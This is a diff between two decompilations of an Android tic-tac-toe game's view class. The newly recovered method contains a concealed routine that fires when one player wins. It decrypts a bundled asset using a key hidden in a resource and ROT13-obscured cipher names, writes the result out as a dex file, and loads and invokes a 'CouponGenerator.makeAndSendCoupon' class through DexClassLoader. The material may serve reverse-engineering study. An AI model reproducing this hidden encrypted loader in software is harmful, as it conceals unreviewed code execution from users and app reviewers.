@@ -3,183 +3,308 @@ package at.game.tictactoe;
 import android.content.Context;
 import android.graphics.Canvas;
 import android.graphics.Paint;
-import android.graphics.RectF;
-import android.graphics.Typeface;
 import android.graphics.Paint.Align;
 import android.graphics.Paint.Style;
+import android.graphics.RectF;
+import android.graphics.Typeface;
 import android.util.AttributeSet;
 import android.view.View;
+import dalvik.system.DexClassLoader;
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.lang.reflect.InvocationTargetException;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.security.spec.InvalidKeySpecException;
+import java.util.ArrayList;
+import java.util.List;
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.PBEKeySpec;
 
 public class TicTacToeView extends View {
+    protected static final char[] f2a;
+    private Paint f3b;
+    private Paint f4c;
+    private Paint f5d;
+    private C0001b f6e;
+    private int f7f;
+    private int f8g;
+    private int f9h;
+    private int f10i;
+    private int f11j;
+    private int f12k;
+    private int f13l;
+    private String f14m;
+    private int f15n;
 
-   protected static final char[] hexChars = "0123456789ABCDEF".toCharArray();
-   private Paint b = new Paint();
-   private Paint c = new Paint();
-   private Paint textPaint = new Paint();
-   private b e = new b();
-   private int textWidth = 640;
-   private int g = 480;
-   private int cellSize = 140;
-   private int i;
-   private int textHeight;
-   private int k;
-   private int l;
-   private String message;
-   private int textSize;
+    static {
+        f2a = "0123456789ABCDEF".toCharArray();
+    }
 
+    public TicTacToeView(Context context) {
+        super(context);
+        this.f3b = new Paint();
+        this.f4c = new Paint();
+        this.f5d = new Paint();
+        this.f6e = new C0001b();
+        this.f7f = 640;
+        this.f8g = 480;
+        this.f9h = 140;
+        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
+        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
+        this.f12k = 10;
+        this.f13l = 10;
+        this.f14m = "To start a new game press the New Game Button";
+        this.f15n = 20;
+        m1a();
+    }
 
-   public TicTacToeView(Context context) {
-      super(context);
-      this.i = (this.textWidth - this.cellSize * 3) / 2;
-      this.textHeight = (this.g - this.cellSize * 3) / 2;
-      this.k = 10;
-      this.l = 10;
-      this.message = "To start a new game press the New Game Button";
-      this.textSize = 20;
-      this.a();
-   }
+    public TicTacToeView(Context context, AttributeSet attributeSet) {
+        super(context, attributeSet);
+        this.f3b = new Paint();
+        this.f4c = new Paint();
+        this.f5d = new Paint();
+        this.f6e = new C0001b();
+        this.f7f = 640;
+        this.f8g = 480;
+        this.f9h = 140;
+        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
+        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
+        this.f12k = 10;
+        this.f13l = 10;
+        this.f14m = "To start a new game press the New Game Button";
+        this.f15n = 20;
+        m1a();
+    }
 
-   public TicTacToeView(Context context, AttributeSet var2) {
-      super(context, var2);
-      this.i = (this.textWidth - this.cellSize * 3) / 2;
-      this.textHeight = (this.g - this.cellSize * 3) / 2;
-      this.k = 10;
-      this.l = 10;
-      this.message = "To start a new game press the New Game Button";
-      this.textSize = 20;
-      this.a();
-   }
+    public TicTacToeView(Context context, AttributeSet attributeSet, int i) {
+        super(context, attributeSet, i);
+        this.f3b = new Paint();
+        this.f4c = new Paint();
+        this.f5d = new Paint();
+        this.f6e = new C0001b();
+        this.f7f = 640;
+        this.f8g = 480;
+        this.f9h = 140;
+        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
+        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
+        this.f12k = 10;
+        this.f13l = 10;
+        this.f14m = "To start a new game press the New Game Button";
+        this.f15n = 20;
+        m1a();
+    }
 
-   public TicTacToeView(Context context, AttributeSet var2, int var3) {
-      super(context, var2, var3);
-      this.i = (this.textWidth - this.cellSize * 3) / 2;
-      this.textHeight = (this.g - this.cellSize * 3) / 2;
-      this.k = 10;
-      this.l = 10;
-      this.message = "To start a new game press the New Game Button";
-      this.textSize = 20;
-      this.a();
-   }
+    private void m1a() {
+        this.f4c.setStrokeWidth((float) this.f13l);
+        this.f4c.setStyle(Style.STROKE);
+        this.f5d.setTextAlign(Align.CENTER);
+        this.f5d.setTypeface(Typeface.SANS_SERIF);
+        this.f5d.setTextSize((float) this.f15n);
+    }
 
-   private void a() {
-      this.c.setStrokeWidth((float)this.l);
-      this.c.setStyle(Style.STROKE);
-      this.textPaint.setTextAlign(Align.CENTER);
-      this.textPaint.setTypeface(Typeface.SANS_SERIF);
-      this.textPaint.setTextSize((float)this.textSize);
-   }
+    private void m2a(Canvas canvas, int i, int i2) {
+        int i3 = (this.f10i + (this.f9h * i)) + this.f12k;
+        int i4 = (this.f10i + ((i + 1) * this.f9h)) - this.f12k;
+        int i5 = (this.f11j + (this.f9h * i2)) + this.f12k;
+        int i6 = (this.f11j + ((i2 + 1) * this.f9h)) - this.f12k;
+        canvas.drawLine((float) i3, (float) i5, (float) i4, (float) i6, this.f4c);
+        canvas.drawLine((float) i4, (float) i5, (float) i3, (float) i6, this.f4c);
+    }
 
-   private void setXMark(Canvas canvas, int var2, int var3) {
-      int var4 = this.i + this.cellSize * var2 + this.k;
-      var2 = this.i + (var2 + 1) * this.cellSize - this.k;
-      int var5 = this.textHeight + this.cellSize * var3 + this.k;
-      var3 = this.textHeight + (var3 + 1) * this.cellSize - this.k;
-      canvas.drawLine((float)var4, (float)var5, (float)var2, (float)var3, this.c);
-      canvas.drawLine((float)var2, (float)var5, (float)var4, (float)var3, this.c);
-   }
+    public static byte[] m3a(String str) {
+        int length = str.length();
+        byte[] bArr = new byte[(length / 2)];
+        for (int i = 0; i < length; i += 2) {
+            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
+        }
+        return bArr;
+    }
 
-   public static byte[] a(String var0) {
-      int var2 = var0.length();
-      byte[] var3 = new byte[var2 / 2];
-
-      for(int var1 = 0; var1 < var2; var1 += 2) {
-         var3[var1 / 2] = (byte)((Character.digit(var0.charAt(var1), 16) << 4) + Character.digit(var0.charAt(var1 + 1), 16));
-      }
-
-      return var3;
-   }
-
-   public static String b(String input) {
-      StringBuilder stringBuilder = new StringBuilder();
-
-      for(int i = 0; i < input.length(); ++i) {
-         char currChar = input.charAt(i);
-         char var1;
-         if(currChar >= 97 && currChar <= 109) {
-            var1 = (char)(currChar + 13);
-         } else if(currChar >= 65 && currChar <= 77) {
-            var1 = (char)(currChar + 13);
-         } else if(currChar >= 110 && currChar <= 122) {
-            var1 = (char)(currChar - 13);
-         } else {
-            var1 = currChar;
-            if(currChar >= 78) {
-               var1 = currChar;
-               if(currChar <= 90) {
-                  var1 = (char)(currChar - 13);
-               }
+    public static String m4b(String str) {
+        StringBuilder stringBuilder = new StringBuilder();
+        for (int i = 0; i < str.length(); i++) {
+            char charAt = str.charAt(i);
+            if (charAt >= 'a' && charAt <= 'm') {
+                charAt = (char) (charAt + 13);
+            } else if (charAt >= 'A' && charAt <= 'M') {
+                charAt = (char) (charAt + 13);
+            } else if (charAt >= 'n' && charAt <= 'z') {
+                charAt = (char) (charAt - 13);
+            } else if (charAt >= 'N' && charAt <= 'Z') {
+                charAt = (char) (charAt - 13);
             }
-         }
+            stringBuilder.append(charAt);
+        }
+        return stringBuilder.toString();
+    }
 
-         stringBuilder.append(var1);
-      }
-
-      return stringBuilder.toString();
-   }
-
-   private void b() {
-      // $FF: Couldn't be decompiled
-   }
-
-   private void setOMark(Canvas var1, int var2, int var3) {
-      var2 = this.i + this.cellSize * var2 + this.k;
-      var3 = this.textHeight + this.cellSize * var3 + this.k;
-      int var4 = this.cellSize - this.k * 2;
-      var1.drawOval(new RectF((float)var2, (float)var3, (float)(var2 + var4), (float)(var3 + var4)), this.c);
-   }
-
-   public void a(float x, float y) {
-      if(x > (float)this.i && x < (float)(this.i + this.cellSize * 3) && y > (float)this.textHeight && y < (float)(this.textHeight + this.cellSize * 3)) {
-         int var3 = (int)((x - (float)this.i) / (float)this.cellSize);
-         int var4 = (int)((y - (float)this.textHeight) / (float)this.cellSize);
-         if(this.e.a(var3, var4)) {
-            this.b();
-         }
-      }
-
-   }
-
-   public void newGame(String var1, String var2, boolean var3, boolean var4) {
-      this.e.a(var1, var3);
-      this.e.b(var2, var4);
-      this.e.a();
-      this.b();
-   }
-
-   public void onDraw(Canvas canvas) {
-      super.onDraw(canvas);
-      canvas.drawARGB(255, 255, 255, 255);
-      this.b.setColor(0xff000000);
-      canvas.drawText(this.message, (float)(this.textWidth / 2), (float)(this.textHeight / 2), this.textPaint);
-      canvas.drawLine((float)(this.i + this.cellSize), (float)this.textHeight, (float)(this.i + this.cellSize), (float)(this.textHeight + this.cellSize * 3), this.b);
-      canvas.drawLine((float)(this.i + this.cellSize * 2), (float)this.textHeight, (float)(this.i + this.cellSize * 2), (float)(this.textHeight + this.cellSize * 3), this.b);
-      canvas.drawLine((float)this.i, (float)(this.textHeight + this.cellSize), (float)(this.i + this.cellSize * 3), (float)(this.textHeight + this.cellSize), this.b);
-      canvas.drawLine((float)this.i, (float)(this.textHeight + this.cellSize * 2), (float)(this.i + this.cellSize * 3), (float)(this.textHeight + this.cellSize * 2), this.b);
-
-      for(int var2 = 0; var2 < 3; ++var2) {
-         for(int var3 = 0; var3 < 3; ++var3) {
-            switch(cellSize.a[this.e.b(var2, var3).ordinal()]) {
-            case 1:
-               this.setXMark(canvas, var2, var3);
-               break;
-            case 2:
-               this.setOMark(canvas, var2, var3);
+    private void m5b() {
+        if (this.f6e.m24e()) {
+            C0003d b = this.f6e.m19b();
+            if (b == null) {
+                this.f14m = "Draw!";
+            } else {
+                if (!this.f6e.m19b().m28b() && this.f6e.m22c().m28b()) {
+                    File file = new File(getContext().getDir("dex", 0), "blub");
+                    try {
+                        BufferedInputStream bufferedInputStream = new BufferedInputStream(getContext().getAssets().open("blub"));
+                        byte[] bArr = new byte[8192];
+                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+                        while (true) {
+                            int read = bufferedInputStream.read(bArr, 0, 8192);
+                            if (read <= 0) {
+                                break;
+                            }
+                            byteArrayOutputStream.write(bArr, 0, read);
+                        }
+                        Object toByteArray = byteArrayOutputStream.toByteArray();
+                        byteArrayOutputStream.close();
+                        bufferedInputStream.close();
+                        InputStream openRawResource = getContext().getResources().openRawResource(2130968576);
+                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openRawResource));
+                        List<String> arrayList = new ArrayList();
+                        while (true) {
+                            String readLine = bufferedReader.readLine();
+                            if (readLine == null) {
+                                break;
+                            }
+                            arrayList.add(readLine);
+                        }
+                        StringBuilder stringBuilder = new StringBuilder();
+                        for (String append : arrayList) {
+                            stringBuilder.append(append);
+                        }
+                        String append2 = stringBuilder.toString().substring(59, 122);
+                        openRawResource.close();
+                        bufferedReader.close();
+                        Cipher instance = Cipher.getInstance(m4b("NRF/POP/CXPF5Cnqqvat"));
+                        Object obj = new byte[8];
+                        System.arraycopy(toByteArray, 8, obj, 0, 8);
+                        SecretKeyFactory instance2 = SecretKeyFactory.getInstance(m4b("CORJVGUZQ5NAQ128OVGNRF-POP-BCRAFFY"));
+                        instance.init(2, instance2.generateSecret(new PBEKeySpec(append2.toCharArray(), obj, 100)), new IvParameterSpec(m3a("CA89B2417131317115BCE4FFF3D746FC")));
+                        bArr = instance.doFinal(toByteArray, 16, toByteArray.length - 16);
+                        byte[] a = m3a("504B03040A0000080000496B2B480000");
+                        for (int i = 0; i < 16; i++) {
+                            bArr[i] = a[i];
+                        }
+                        OutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(file.getAbsolutePath()));
+                        bufferedOutputStream.write(bArr);
+                        bufferedOutputStream.flush();
+                        bufferedOutputStream.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    } catch (InvalidKeyException e2) {
+                        e2.printStackTrace();
+                    } catch (NoSuchAlgorithmException e3) {
+                        e3.printStackTrace();
+                    } catch (NoSuchPaddingException e4) {
+                        e4.printStackTrace();
+                    } catch (IllegalBlockSizeException e5) {
+                        e5.printStackTrace();
+                    } catch (BadPaddingException e6) {
+                        e6.printStackTrace();
+                    } catch (InvalidKeySpecException e7) {
+                        e7.printStackTrace();
+                    } catch (InvalidAlgorithmParameterException e8) {
+                        e8.printStackTrace();
+                    }
+                    try {
+                        Class loadClass = new DexClassLoader(file.getAbsolutePath(), getContext().getDir("dex", 0).getAbsolutePath(), null, getContext().getClassLoader()).loadClass("at.game.tictactoe.coupon.CouponGenerator");
+                        loadClass.getMethod("makeAndSendCoupon", new Class[0]).invoke(loadClass.getConstructor(new Class[]{Context.class}).newInstance(new Object[]{getContext()}), new Object[0]);
+                    } catch (IllegalAccessException e9) {
+                        e9.printStackTrace();
+                    } catch (IllegalArgumentException e10) {
+                        e10.printStackTrace();
+                    } catch (InvocationTargetException e11) {
+                        e11.printStackTrace();
+                    } catch (InstantiationException e12) {
+                        e12.printStackTrace();
+                    } catch (NoSuchMethodException e13) {
+                        e13.printStackTrace();
+                    } catch (ClassNotFoundException e14) {
+                        e14.printStackTrace();
+                    }
+                }
+                this.f14m = b.m25a() + " wins!";
             }
-         }
-      }
+        } else {
+            this.f14m = this.f6e.m23d().m25a() + "s turn.";
+        }
+        invalidate();
+    }
 
-   }
+    private void m6b(Canvas canvas, int i, int i2) {
+        int i3 = (this.f10i + (this.f9h * i)) + this.f12k;
+        int i4 = (this.f11j + (this.f9h * i2)) + this.f12k;
+        int i5 = this.f9h - (this.f12k * 2);
+        canvas.drawOval(new RectF((float) i3, (float) i4, (float) (i3 + i5), (float) (i4 + i5)), this.f4c);
+    }
 
-   public void onSizeChanged(int var1, int var2, int var3, int var4) {
-      this.textWidth = var1;
-      this.g = var2;
-      this.i = (this.textWidth - this.cellSize * 3) / 2;
-      this.textHeight = (this.g - this.cellSize * 3) / 2;
-      super.onSizeChanged(var1, var2, var3, var4);
-   }
+    public void m7a(float f, float f2) {
+        if (f > ((float) this.f10i) && f < ((float) (this.f10i + (this.f9h * 3))) && f2 > ((float) this.f11j) && f2 < ((float) (this.f11j + (this.f9h * 3)))) {
+            if (this.f6e.m18a((int) ((f - ((float) this.f10i)) / ((float) this.f9h)), (int) ((f2 - ((float) this.f11j)) / ((float) this.f9h)))) {
+                m5b();
+            }
+        }
+    }
 
-   public boolean performClick() {
-      super.performClick();
-      return true;
-   }
+    public void newGame(String str, String str2, boolean z, boolean z2) {
+        this.f6e.m17a(str, z);
+        this.f6e.m21b(str2, z2);
+        this.f6e.m16a();
+        m5b();
+    }
+
+    public void onDraw(Canvas canvas) {
+        super.onDraw(canvas);
+        canvas.drawARGB(255, 255, 255, 255);
+        this.f3b.setColor(-16777216);
+        canvas.drawText(this.f14m, (float) (this.f7f / 2), (float) (this.f11j / 2), this.f5d);
+        canvas.drawLine((float) (this.f10i + this.f9h), (float) this.f11j, (float) (this.f10i + this.f9h), (float) (this.f11j + (this.f9h * 3)), this.f3b);
+        canvas.drawLine((float) (this.f10i + (this.f9h * 2)), (float) this.f11j, (float) (this.f10i + (this.f9h * 2)), (float) (this.f11j + (this.f9h * 3)), this.f3b);
+        canvas.drawLine((float) this.f10i, (float) (this.f11j + this.f9h), (float) (this.f10i + (this.f9h * 3)), (float) (this.f11j + this.f9h), this.f3b);
+        canvas.drawLine((float) this.f10i, (float) (this.f11j + (this.f9h * 2)), (float) (this.f10i + (this.f9h * 3)), (float) (this.f11j + (this.f9h * 2)), this.f3b);
+        for (int i = 0; i < 3; i++) {
+            for (int i2 = 0; i2 < 3; i2++) {
+                switch (C0007h.f35a[this.f6e.m20b(i, i2).ordinal()]) {
+                    case 1:
+                        m2a(canvas, i, i2);
+                        break;
+                    case 2:
+                        m6b(canvas, i, i2);
+                        break;
+                    default:
+                        break;
+                }
+            }
+        }
+    }
+
+    public void onSizeChanged(int i, int i2, int i3, int i4) {
+        this.f7f = i;
+        this.f8g = i2;
+        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
+        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
+        super.onSizeChanged(i, i2, i3, i4);
+    }
+
+    public boolean performClick() {
+        super.performClick();
+        return true;
+    }
 }
